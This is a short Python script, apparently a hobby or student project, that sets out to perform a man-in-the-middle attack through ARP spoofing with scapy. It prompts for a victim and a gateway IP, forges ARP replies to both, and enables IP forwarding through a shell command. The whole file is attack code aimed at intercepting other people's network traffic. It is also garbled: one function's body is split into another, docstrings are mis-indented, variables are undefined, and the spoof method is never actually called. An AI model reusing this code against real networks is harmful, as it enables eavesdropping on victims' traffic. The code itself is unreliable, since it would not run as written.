"""
Author: Doron Goldman
An python program implenting man in the middle attack through arp spoofing
"""

import scapy.all as sp
import sys
import os
import time

sp.conf.verb = 0
BROADCAST = "ff:ff:ff:ff:ff:ff"
REPLAY = 2


class Attack(object,):

    @staticmethod
    def get_mac(IP):
    """
    args:
    IP:  an ip address
    returns: return the corresponding mac adress
    using the basic arp protocol to discover the targets real mac addres
    """
    ans, uans = sp.srp(sp.Ether(dst=BROADCAST) / sp.ARP(pdst=IP),
                       timeout=2, inter=0.1)
    @staticmethod
    def set_ip_forward(f):
    """
    args: f: 0 for off; 1 for on
    returns: None
    only supported by linux systems 
    sets ip forwarding in the system 
    """
    os.system("echo %s > /proc/sys/net/ipv4/ip_forward" % (f,))
    for snd, rcv in ans:
        # format the mac address from the arp replay
        return rcv.sprintf(r"%Ether.src%")
    
    def __init__(self,):
        self.vIP, self.gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
        self.arp_table = {ip: Attack.get_mac(ip) for ip in [vIP, gIP]}     

    def close(self,):
        sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=BROADCAST,
                    hwsrc=self.arp_table[gIP],), count=7)
        sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=BROADCAST,
                    hwsrc=self.arp_table[vIP],), count=7)
        Attack.set_ip_forward(0)

    def spoof(self,):
        """
        args : self: an Attack instance
        returns: None
        tells the target you are the gateway and the gateway that you are the target
        """
        Attack.set_ip_forward(1)
        sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=self.arp_table[self.vIP]))
        sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=self.arp_table[self.gIP]))

try:
    a = Attack()
    a.spoof
finally:
    a.close()


